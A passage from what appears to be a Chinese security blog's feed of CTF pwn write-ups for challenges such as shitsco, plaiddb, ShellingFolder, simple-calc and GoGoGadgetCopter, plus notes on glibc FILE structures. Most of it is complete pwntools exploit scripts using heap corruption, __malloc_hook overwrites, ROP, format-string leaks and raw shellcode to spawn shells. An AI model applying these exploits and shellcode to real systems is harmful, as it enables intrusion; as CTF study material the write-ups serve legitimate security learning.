'\x31\x00') create(p, 0x30, 'a' * 0x18 + p32(0x211)[:3]) delete(p, 6) create(p, 0x300, 'a' * 19 * 0x8 + p64(0x61)[:2]) create(p, 0x300, 'a' * 9 * 0x8 + p64(0x91)[:2]) delete(p, 0) create(p, 0x300, 'b' * 10 * 0x8 + '\x00') # 修改12为10 delete(p, 8) # ------------------------------------------ create(p, 0x300, 'a' * 5 * 0x8 + '\x1a\x00') delete(p, 3) p.recvuntil('a' * 3 * 0x8) elf.address = u64(p.recv(6) + '\x00\x00') - (0x55873e14dd1a - 0x55873e14d000) delete(p, 8) ppppr = elf.address + 0x11dc payload = 'a' * 5 * 0x8 + p64(ppppr) create(p, 0x300, payload) bss_addr = elf.address + 0x202800 rdi_ret = elf.address + 0x11e3 p.sendlineafter('quit\n', 'delete ') p.sendlineafter('id:', str(3)) payload = 'yes' + ' ' * 5 + p64(rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) payload += p64(rdi_ret) + p64(elf.got['free']) + p64(elf.plt['puts']) payload += p64(elf.address + 0xc71) p.sendlineafter('?:', payload) recv = p.recvuntil('\x0a', drop=True) libc.address = u64(recv + '\x00\x00') - libc.symbols['puts'] delete(p, 8) payload = 'a' * 2 * 0x8 + '/bin/sh ' + ' ' * 14 + '&amp;&amp;' + p64(libc.symbols['system']) create(p, 0x300, payload) delete(p, 3) # system('/bin/sh &amp;&amp;' + p64(system_addr)) #gdb.attach(p) p.interactive() p.close()if __name__ == '__main__': pwn() DEFCON QUALIFIER 2014 shitsco [2019.02.09]对于我这种逆向渣来说理顺程序逻辑还是花了一点时间Orz。在对set的值进行清除时，如果清除的是第二个变量且保存在.bss上的第一个变量已经被清除时（此时第二个变量的prev值为0，第一个变量的next值为第二个变量的地址），第一个变量的next不会被修改，导致了UAF。只要将第二个变量所在的chunk重新获取并控制其中的内容为保存密码的地址，就能够泄漏密码获得flag。 12345678910111213141516171819202122232425262728293031from pwn import *def pwn(): context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] p = process('./shitsco') p.sendlineafter('$ ', 'set a 1') p.sendlineafter('$ ', 'set b 1') p.sendlineafter('$ ', 'set c 1') p.sendlineafter('$ ', 'set d ' + '1' * 0x18) p.sendlineafter('$ ', 'set a') p.sendlineafter('$ ', 'set b') p.sendlineafter('$ ', 'set d') payload = 'set c ' + p32(0x804844A) + p32(0x804c3a0) + p32(0x804c260) p.sendlineafter('$ ', payload) p.sendlineafter('$ ', 'show') p.recvuntil('sleep: ') password = p.recvuntil('\n', drop=True) payload = 'enable ' + password p.sendlineafter('$ ', payload) p.sendlineafter('# ', 'flag') gdb.attach(p) p.interactive() p.close()if __name__ == '__main__': pwn() PlaidCTF 2015 Plaiddb(datastore) [2019.02.11]在输入索引的函数中，存在着off-by-null。利用off-by-null进行chunk overlap，然后泄漏libc基地址、利用0x70的chunk修改__malloc_hook的值为one_gadget。 漏洞如下： 12345678910111213141516171819202122232425262728293031323334353637char *read_row_key()&#123; char *chunk; // r12 char *current_dest; // rbx size_t usable_size; // r14 char chr; // al MAPDST signed __int64 offset; // r13 char *new_chunk; // rax chunk = (char *)malloc(8uLL); current_dest = chunk; usable_size = malloc_usable_size(chunk); while ( 1 ) &#123; chr = _IO_getc(stdin); if ( chr == -1 ) EXIT(); if ( chr == '\n' ) // 当offset正好为chunk大小时，break，off-by-null break; offset = current_dest - chunk; if ( usable_size &lt;= current_dest - chunk ) // 空间不够用时 &#123; new_chunk = (char *)realloc(chunk, 2 * usable_size); // 扩大两倍 chunk = new_chunk; if ( !new_chunk ) &#123; puts("FATAL: Out of memory"); exit(-1); &#125; current_dest = &amp;new_chunk[offset]; // 更新两个变量 usable_size = malloc_usable_size(new_chunk); &#125; *current_dest++ = chr; &#125; *current_dest = 0; // off-by-null return chunk;&#125; exp如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pwn import *def get(p, key): p.sendlineafter('command:\n', 'GET') p.sendlineafter('row key:\n', key)def put(p, key, data): p.sendlineafter('command:\n', 'PUT') p.sendlineafter('row key:\n', key) p.sendlineafter('size:\n', str(len(data))) p.sendafter('data:\n', data)def delete(p, key): p.sendlineafter('command:\n', 'DEL') p.sendlineafter('row key:\n', key)def dump(p): p.sendlineafter('command:\n', 'DUMP')def pwn(): p = process('./datastore.elf') elf = ELF('./datastore.elf') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] put(p, '1', 'a' * 0x30) put(p, '2', 'b') put(p, '3', 'c' * 0x30) delete(p, '3') delete(p, '2') delete(p, '1') payload = 'a' * 0x1f0 + p64(0x200) + p64(0x90) payload = payload.ljust(0x280, '\x00') put(p, '1', payload) put(p, '2', 'a' * 0x100) put(p, '3', 'a' * 0x60) delete(p, '1') put(p, '1', 'a' * 0x30) put(p, '4' * 0x18, 'a' * 0x300) # off by null delete(p, 'th3fl4g') put(p, 'th3fl4g', 'a' * 0x110) delete(p, '1') put(p, '1' * 0x20, 'a' * 0x60) delete(p, 'th3fl4g') delete(p, '2') put(p, '2', 'a' * 0x110) get(p, '1' * 0x20) p.recvuntil(']:\n') recv = p.recv(6) libc.address = u64(recv + '\x00\x00') - (0x7fbdacf7cb78 - 0x00007fbdacbb8000) log.info('libc:%s', hex(libc.address)) delete(p, '2') payload = 'a' * 0x110 + p64(0) + p64(0x71) payload += 0x68 * 'a' + p64(0x21) put(p, '2', payload) delete(p, '1' * 0x20) delete(p, '2') payload = 'a' * 0x110 + p64(0) + p64(0x71) + p64(libc.symbols['__malloc_hook'] - 0x13) payload += 0x68 * 'a' + p64(0x21) put(p, '2', payload) put(p, '1' * 0x20, 'a' * 0x60) payload = '\x00' * 3 + p64(libc.address + 0x4526a) payload = payload.ljust(0x60, '\x00') put(p, '5', payload) #gdb.attach(p) p.sendlineafter('command:\n', 'PUT') #getshell p.interactive() p.close()if __name__ == '__main__': pwn() HITCON CTF 2016 Quals ShellingFolder [2019.02.14]在0x1334函数中存在信息泄露和任意地址写的漏洞，泄漏堆栈地址并将__malloc_hook改成one_gadget即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from pwn import *def list_current(p): p.sendlineafter('choice:', '1')def change_current(p, new_folder): p.sendlineafter('choice:', '2') p.sendlineafter('Folder :', new_folder)def create_folder(p, name): p.sendlineafter('choice:', '3') p.sendafter('Folder:', name)def create_file(p, name, size): p.sendlineafter('choice:', '4') p.sendafter('File:', name) p.sendlineafter('File:', str(size))def remove(p, name): p.sendlineafter('choice:', '5') p.sendlineafter('file :', name)def calc(p): p.sendlineafter('choice:', '6')def pwn(): #context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] p = process('./shellingfolder') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') create_file(p, 'sunichi', 0) create_file(p, 'sunichi1', -0x10) create_file(p, 'a' * 0x18 + '\x10', 0x38) remove(p, 'sunichi1') calc(p) p.recvuntil('a' * 0x18) recv = p.recv(6) + '\x00\x00' heap_addr = u64(recv) - 0x10 list_current(p) p.recvuntil('----------------------\n') recv = p.recv(6) + '\x00\x00' libc.address = u64(recv) - (0x7f5885ba1b78 - 0x7f58857dd000) log.info('libc:%s' % hex(libc.address)) one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147] create_folder(p, 'getshell') change_current(p, 'getshell') create_file(p, 'a' * 0x18 + p64(libc.symbols['__malloc_hook'])[:6], 0x0) change_current(p, '..') create_folder(p, 'restore') change_current(p, 'restore') create_file(p, 'a' * 0x18 + p64(heap_addr + 0x10)[:6], 0xd8-0x50) calc(p) change_current(p, '..') remove(p, 'a' * 0x18 + '\x10') create_file(p, 'a' * 0x18 + p64(heap_addr + 0x2cd)[:6], ord(p64(libc.address + one_gadget[2])[5])) calc(p) remove(p, 'a' * 0x18 + p64(heap_addr + 0x2cd)[:6]) for i in range(5): create_file(p, 'a' * 0x18 + p64(heap_addr + 0x2cc - i)[:6], ord(p64(libc.address + one_gadget[2])[4 - i])) calc(p) remove(p, 'a' * 0x18 + p64(heap_addr + 0x2cc - i)[:6]) change_current(p, 'getshell') calc(p) change_current(p, '..') log.info('one_gadget:%s' % hex(libc.address + one_gadget[2])) log.info('heap:%s' % hex(heap_addr)) gdb.attach(p) remove(p, '\x91') # get shell p.interactive() p.close()if __name__ == '__main__': pwn() Boston Key Party 2016 simple-calc-5 [2019.02.15]保存结果时存在复制后栈溢出，可以ROP，但程序静态编译，需要ROP到mprotect将部分内存修改为wx属性来ret2shellcode。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687from pwn import *def add(p, num1, num2): p.sendlineafter('=&gt; ', '1') p.sendlineafter('x: ', str(num1)) p.sendlineafter('y: ', str(num2))def subs(p, num1, num2): p.sendlineafter('=&gt; ', '2') p.sendlineafter('x: ', str(num1)) p.sendlineafter('y: ', str(num2))def set_zero(p): subs(p, 0x2000, 0x2000)def pwn(): p = process('./calc') context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] p.sendlineafter('calculations: ', '100') #gdb.attach(p, gdbscript='b *0x401588') for i in range(0x6): add(p, 0xbead, 0x2000) add(p, 0xbead, 0x2000) set_zero(p) set_zero(p) add(p, 0xbead, 0x2000) add(p, 0xbead, 0x2000) # saved rbp add(p, 0x6c0000, 0x5800) set_zero(p) # pop rdi; ret add(p, 0x400000, 0x1b73) set_zero(p) add(p, 0x6c0000, 0x5000) set_zero(p) # pop rsi; ret add(p, 0x400000, 0x1c87) set_zero(p) add(p, 0x800, 0x800) set_zero(p) # pop rdx; ret add(p, 0x400000, 0x37a85) set_zero(p) subs(p, 0x807, 0x800) set_zero(p) # call mprotect add(p, 0x400000, 0x35690) set_zero(p) # call read # pop rdi; ret add(p, 0x400000, 0x1b73) set_zero(p) set_zero(p) set_zero(p) # pop rsi; ret add(p, 0x400000, 0x1c87) set_zero(p) add(p, 0x6c0000, 0x5e00) set_zero(p) # pop rdx; ret add(p, 0x400000, 0x37a85) set_zero(p) subs(p, 0x900, 0x800) set_zero(p) # call read add(p, 0x400000, 0x34b20) set_zero(p) # ret2shellcode add(p, 0x6c0000, 0x5e00) set_zero(p) p.sendlineafter('=&gt; ', '5') shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" p.sendline(shellcode) p.interactive() p.close()if __name__ == '__main__': pwn() HITCON 2016 babyheap [2019.02.18]NullCON 2019 shop [2019.02.21]use after free漏洞，通过double free可以泄漏got表信息、获取libc。修改__malloc_hook即可getshell。也有wp通过格式化字符串漏洞实现信息泄露。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from pwn import *def new(p, size, name): p.sendlineafter('&gt; ', '1') p.sendlineafter('length: ', str(size)) p.sendafter('name: ', name) p.sendlineafter('price: ', '17')def delete(p, idx): p.sendlineafter('&gt; ', '2') p.sendlineafter('index: ', str(idx))def view(p): p.sendlineafter('&gt; ', '3')def pwn(): p = process('./challenge') elf = ELF('./challenge') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') new(p, 0x60, '/bin/sh') new(p, 0x60, '/bin/sh') new(p, 0x60, '/bin/sh') new(p, 0x30, '3') new(p, 0x60, '/bin/sh') new(p, 0x60, '/bin/sh') new(p, 0x60, '/bin/sh') context.terminal = ['tmux', 'split', '-h'] delete(p, 0) delete(p, 1) delete(p, 0) payload = p64(0) + p64(elf.got['puts']) new(p, 0x30, payload) view(p) # get puts address delete(p, 2) delete(p, 0) payload = p64(0) + p64(elf.got['fgets']) new(p, 0x30, payload) # context.log_level='debug' view(p) # get fgets address p.recvuntil('"name": "') p.recvuntil('"name": "') recv = p.recv(6) + '\x00\x00' libc.address = u64(recv) - (0x7fbe1d061ad0 - 0x00007fbe1cff4000) # get libc log.info('libc:%s' % hex(libc.address)) delete(p, 3) delete(p, 0) new(p, 0x60, '\n') new(p, 0x60, p64(libc.symbols['__malloc_hook'] - 0x13)) new(p, 0x60, '\n') new(p, 0x60, '\n') payload = '\x7f\x00\x00' + p64(libc.address + 0xf02a4) new(p, 0x60, payload) delete(p, 0) # get shell # gdb.attach(p) p.interactive() p.close()if __name__ == '__main__': pwn() NullCON 2019 babypwn [2019.02.28]格式化字符串和有、无符号数的比较两个漏洞。虽然能够溢出，但是程序开启了canary保护，需要想办法规避。看了其他人的wp才知道，对于 1scanf("%d", ...) 来说，如果用户输入字符-或+，scanf函数不会改变相应变量的值。涨知识了。绕过canary后就是常规的格式化字符串漏洞了。 原文： 123This requires knowledge of a cool scanf trick. When scanf is called like so:scanf(&quot;%d&quot;, ...);You can provide the characters - or +, and the scanf will not change the value of the variable.]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Happy 2019 Chinese New Year]]></title>
    <url>%2F2019%2F02%2F05%2Fhappy-2019-chinese-new-year%2F</url>
    <content type="text"><![CDATA[猪年（己亥年）快乐！]]></content>
      <tags>
        <tag>2019</tag>
        <tag>happy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019 Jan pwn writeup]]></title>
    <url>%2F2019%2F01%2F30%2F19-Jan%2F</url>
    <content type="text"><![CDATA[MMACTF 2016 shadow程序的基本功能包括：输入姓名；设定message长度；输入message。共有3次修改姓名和message的机会。 程序中实现了一个影子栈及pop、push、call和ret的函数，使得无法覆盖调用ret进行返回的函数的返回地址。在进行函数调用时，未被保护到的函数为程序调用的libc中的函数，这些函数仍然执行汇编指令ret进行返回而不是程序自行实现的ret函数。 利用无符号数的转换来泄漏canary和libc地址。由于name的地址保存在栈上，通过输入的漏洞可以覆盖该地址为_environ地址来泄漏栈地址。用于记录剩余输入次数的变量也保存在栈上。在修改name前，把name指向read函数的返回地址（libc中的函数没有得到ret函数的保护），使得在修改name时能够控制程序执行流来getshell。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263# coding=utf-8from pwn import *def pwn(): BIN_PATH = './shadow' DEBUG = 1 context.arch = 'i386' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') # leak canary p.recvuntil('name : ') p.sendline('sunichi') p.recvuntil('length : ') p.sendline('-1') p.sendafter('message : ', 'a' * 33) p.recvuntil('a' * 33) canary = '\x00' + p.recv(3) # leak libc p.sendlineafter('(y/n) :', 'n') p.recvuntil('length : ') p.sendline('-1') payload = 'a' * 41 p.sendafter('message : ', payload) p.recvuntil(payload) recv = '\x00' + p.recv(3) recv = u32(recv) print hex(recv) libc.address = recv - (0xf76f3000 - 0xf7541000) print hex(libc.address) # leak stack address p.sendlineafter('(y/n) :', 'n') p.recvuntil('length : ') p.sendline('-1') payload = 'a' * 0x20 + canary + 'a' * 8 + p32(0) + p32(0) payload += p32(libc.symbols['_environ']) + p32(0x0804a800) + p32(100) p.sendafter('message : ', payload) p.recvuntil(') &lt;') stack_addr = u32(p.recv(4)) print hex(stack_addr) # attack p.sendlineafter('(y/n) :', 'n') p.recvuntil('length : ') p.sendline('-1') payload = 'a' * 0x20 + canary + 'a' * 8 + p32(0) + p32(0) payload += p32(stack_addr - (0x98c-0x7bc)) + p32(0x0804a800) + p32(100) p.sendafter('message : ', payload) payload = p32(libc.symbols['system']) + p32(0x0804a800) + p64(next(libc.search('/bin/sh'))) p.sendafter('name : ', payload) p.interactive() p.close()if __name__ == '__main__': pwn() Insomni’hack 2018 GoGoGadgetCopter输入内容时调用的read函数，可以用来泄漏地址。Gadget的scanf函数导致off-by-null，可用来制造堆块重叠。利用House of Orange来getshell。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238from pwn import *_IO_FILE_plus_size = &#123; 'i386': 0x98, 'amd64': 0xe0&#125;_IO_FILE_plus = &#123; 'i386': &#123; 0x0: '_flags', 0x4: '_IO_read_ptr', 0x8: '_IO_read_end', 0xc: '_IO_read_base', 0x10: '_IO_write_base', 0x14: '_IO_write_ptr', 0x18: '_IO_write_end', 0x1c: '_IO_buf_base', 0x20: '_IO_buf_end', 0x24: '_IO_save_base', 0x28: '_IO_backup_base', 0x2c: '_IO_save_end', 0x30: '_markers', 0x34: '_chain', 0x38: '_fileno', 0x3c: '_flags2', 0x40: '_old_offset', 0x44: '_cur_column', 0x46: '_vtable_offset', 0x47: '_shortbuf', 0x48: '_lock', 0x4c: '_offset', 0x54: '_codecvt', 0x58: '_wide_data', 0x5c: '_freeres_list', 0x60: '_freeres_buf', 0x64: '__pad5', 0x68: '_mode', 0x6c: '_unused2', 0x94: 'vtable' &#125;, 'amd64': &#123; 0x0: '_flags', 0x8: '_IO_read_ptr', 0x10: '_IO_read_end', 0x18: '_IO_read_base', 0x20: '_IO_write_base', 0x28: '_IO_write_ptr', 0x30: '_IO_write_end', 0x38: '_IO_buf_base', 0x40: '_IO_buf_end', 0x48: '_IO_save_base', 0x50: '_IO_backup_base', 0x58: '_IO_save_end', 0x60: '_markers', 0x68: '_chain', 0x70: '_fileno', 0x74: '_flags2', 0x78: '_old_offset', 0x80: '_cur_column', 0x82: '_vtable_offset', 0x83: '_shortbuf', 0x88: '_lock', 0x90: '_offset', 0x98: '_codecvt', 0xa0: '_wide_data', 0xa8: '_freeres_list', 0xb0: '_freeres_buf', 0xb8: '__pad5', 0xc0: '_mode', 0xc4: '_unused2', 0xd8: 'vtable' &#125;&#125;class IO_FILE_plus_struct(dict): arch = None endian = None fake_file = None size = 0 FILE_struct = [] @LocalContext def __init__(self): self.arch = context.arch self.endian = context.endian if self.arch != 'i386' and self.arch != 'amd64': log.error('architecture not supported!') success('arch: '+str(self.arch)) self.FILE_struct = [_IO_FILE_plus[self.arch][i] for i in sorted(_IO_FILE_plus[self.arch].keys())] print self.FILE_struct self.update(&#123;r: 0 for r in self.FILE_struct&#125;) self.size = _IO_FILE_plus_size[self.arch] def __setitem__(self, item, value): if item not in self.FILE_struct: log.error("Unknown item %r (not in %r)" % (item, self.FILE_struct)) super(IO_FILE_plus_struct, self).__setitem__(item, value) def __setattr__(self, attr, value): if attr in IO_FILE_plus_struct.__dict__: super(IO_FILE_plus_struct, self).__setattr__(attr, value) else: self[attr] = value def __getattr__(self, attr): return self[attr] def __str__(self): fake_file = "" with context.local(arch=self.arch): for item_offset in sorted(self.item_offset): if len(fake_file) &lt; item_offset: fake_file += "\x00"*(item_offset - len(fake_file)) fake_file += pack(self[_IO_FILE_plus[self.arch] [item_offset]], word_size='all') fake_file += "\x00"*(self.size - len(fake_file)) return fake_file @property def item_offset(self): return _IO_FILE_plus[self.arch].keys()def Create(p, content): p.sendlineafter('Go Go Gadget: ', str(1)) p.sendlineafter('Gadget :', content) if len(content) == 0xa8: p.recvuntil('Go Go Gadget: ')def Delete(p, idx): p.sendlineafter('Go Go Gadget: ', str(2)) p.sendlineafter('Gadget [id] :', str(idx))def GoGoGadget(p, idx): p.sendlineafter('Go Go Gadget: ', str(3)) p.sendlineafter('Gadget [idx] :', str(idx))def Active(p, speed, content): p.sendlineafter('Go Go Gadget: ', str(4)) p.sendlineafter('Speed :', str(speed)) p.sendafter('Destination :', content)def Deactive(p): p.sendlineafter('Go Go Gadget: ', str(5))def GoGoCopter(p): p.sendlineafter('Go Go Gadget: ', str(6))def pwn(): BIN_PATH = './gogogadget' context.arch = 'amd64' p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') Create(p, 'sunichi') Create(p, p64(0x60) * (0xa0 / 8)) Create(p, p64(0x60) * (0xa0 / 8)) Create(p, 'sunichi') Create(p, 'sunichi') Delete(p, 0) Delete(p, 1) Delete(p, 2) Delete(p, 3) payload = 'a' * 0xa0 + p64(0xb0) Create(p, payload) p.recvuntil('Wrong input !') payload = 'a' * 0xa0 + p64(0xb0)[:7] Create(p, payload) Active(p, 0, '\x78') GoGoCopter(p) p.recvuntil('Gogo Copter To: ') recv = p.recv(6) arena_88_addr = u64(recv.ljust(8, '\x00')) libc.address = arena_88_addr - (0x7efee8b41b78 - 0x00007efee877d000) Delete(p, 1) Delete(p, 4) Create(p, 'sunichi') Create(p, 'sunichi') Create(p, 'sunichi') Create(p, 'sunichi') Delete(p, 1) Delete(p, 3) GoGoCopter(p) p.recvuntil('Gogo Copter To: ') recv = p.recv(6) heap_addr = u64(recv.ljust(8, '\x00')) fake_file = IO_FILE_plus_struct() fake_file._flags = u64('/bin/sh\x00') fake_file._IO_read_ptr = 0x61 fake_file._IO_read_base = 0x7fffffffffff-0x10 fake_file._IO_write_base = 0 fake_file._IO_write_ptr = 1 fake_file._mode = 0 fake_file.vtable = heap_addr - 80 payload = p64(0) * 2 + p64(libc.symbols['system']) * 3 payload = payload.ljust(0x50, '\x00') + '/bin/sh\x00' + p64(0xf1)[:2] Create(p, payload) payload = p64(0) + p64(0) + p64(0) + p64(1) + '\x00' * 0x21 Create(p, payload) Delete(p, 4) Create(p, str(fake_file)[0x70:0xc8] + p64(0x51) + p64(0) * 3 + p64(heap_addr - 80)) Delete(p, 1) Delete(p, 3) payload = p64(0) + p64(1) + p64(2) + p64(libc.symbols['system']) payload = payload.ljust(0x50, '\x00') + '/bin/sh\x00' + p64(0x61) payload += p64(libc.address + (0x7ffff7dd1b78 - 0x7ffff7a0d000)) + p64(libc.symbols['_IO_list_all'] - 0x10) payload += p64(0x30) + p64(0x40) Create(p, payload) print hex(heap_addr) print hex(arena_88_addr) print hex(libc.address) gdb.attach(p) p.interactive() p.close()if __name__ == "__main__": pwn()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BCTF 2018 pwn writeup]]></title>
    <url>%2F2019%2F01%2F13%2Fbctf18-pwn%2F</url>
    <content type="text"><![CDATA[easiest通过double free修改got项到程序中的getshell函数。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859# coding=utf-8from pwn import *def Add(p, idx, size, content): p.sendlineafter('delete \n', str(1)) p.sendlineafter('(0-11):', str(idx)) p.sendlineafter('Length:', str(size)) p.sendlineafter('C:', content)def Delete(p, idx): p.sendlineafter('delete \n', str(2)) p.sendlineafter('(0-11):', str(idx))def pwn(): BIN_PATH = './easiest' DEBUG = 1 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('39.96.9.148', 9999) elf = ELF(BIN_PATH) context.log_level = 'debug' Add(p, 0, 0x68, 'sunichi') Add(p, 1, 0x68, 'sunichi') Add(p, 2, 0x100, 'sunichi') Add(p, 3, 0x100, 'sunichi') Delete(p, 0) Delete(p, 1) Delete(p, 0) Delete(p, 2) Add(p, 0, 0x68, p64(0x602045)) Add(p, 1, 0x68, 'sunichi') Add(p, 2, 0x68, 'sunichi') payload = '\x00\x00\x00' + p64(0x400946) * 6 Add(p, 3, 0x68, payload) gdb.attach(p) raw_input() p.interactive() p.close()if __name__ == '__main__': pwn() hardcore_fmt利用%a泄漏mmap的地址，然后通过向前偏移泄漏canary，接着通过one_gadget（同样通过前向偏 移计算libc基地址）拿到shell。 本地和服务器偏移不一致，需要轻度爆破。 C99 %a：Hexadecimal floating point, lowercase. (-0xc.90fep-2) 后来调试了一下，输出的地址是在printf_chk执行过程中压入到栈中的。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# coding=utf-8from pwn import *def pwn(): BIN_PATH = './hardcore_fmt' DEBUG = 0 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') f = open('/proc/'+str(pidof(p)[0])+'/maps') data = f.read().split('\n') f.close() for j in data: if 'hardcore_fmt' in j: elf.address = int('0x' + j[0:12], 16) else: p = remote('39.106.110.69', 9999) elf = ELF(BIN_PATH) libc = ELF('./libc-2.27.so') context.log_level = 'debug' if DEBUG == 1: gdb.attach(p) raw_input() p.sendline('%a%2$a%3$a') p.recvuntil('0x0.0') p.recvuntil('0x0.0') recv = p.recv(10) + '00' if DEBUG == 1: p.sendline(str(int(recv, 16) - 35800 + 1)) else: p.sendline(str(int(recv, 16) - 41216 + 0x1000 * 6 + 0x1529)) p.recvuntil(': ') canary = '\x00' + p.recv(7) libc_base = int(recv, 16) - 6398208 print hexdump(canary) print hex(int(recv, 16)) raw_input() p.sendline('a' * 0x108 + canary + p64(0) + p64(0) + p64(int(recv, 16)) + p64(libc_base + 0x4f322)) p.interactive() p.close()if __name__ == '__main__': pwn() SOS原理参考这篇⽂章：https://blogs.msmvps.com/gdicanio/2016/11/17/the-small-string-optimization/ 也是SECCON 2018 CTF的⼀道题的出题点。在C++中，当⼀个string对象较⼩时，为 了优化效率，会将其分配到栈上⽽不是堆上，这样就能栈溢出ROP了，这题⽐较坑的⼀个地⽅是如何结束输⼊。]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>bctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leak From Stdout]]></title>
    <url>%2F2018%2F11%2F29%2Fleak-from-stdout%2F</url>
    <content type="text"><![CDATA[在最近的一些题目中，多次运用到了修改stdout的FILE结构体中的缓冲区指针进行信息泄漏，参考了大佬们阅读源代码的博客，记录一下。 以下是三个涉及FILE的主要结构体： _IO_FILE_plus结构体： 1234567891011// from libioP.h in glibc/* We always allocate an extra word following an _IO_FILE. This contains a pointer to the function jump table used. This is for compatibility with C++ streambuf; the word can be used to smash to a pointer to a virtual function table. */struct _IO_FILE_plus&#123; _IO_FILE file; const struct _IO_jump_t *vtable;&#125;; _IO_FILE结构体： 12345678910111213141516171819202122232425262728293031323334353637383940414243// from /usr/include/libio.hstruct _IO_FILE &#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;; _IO_jump_t结构体： 1234567891011121314151617181920212223242526272829struct _IO_jump_t&#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue);#if 0 get_column; set_column;#endif&#125;; 以下是FILE结构体进行输出时的相关代码： 123456789101112131415161718// from fileops.c in glibcint _IO_new_file_overflow (_IO_FILE *f, int ch)&#123; if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */ &#123; //... return EOF; &#125; if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL) &#123; //... &#125; if (ch 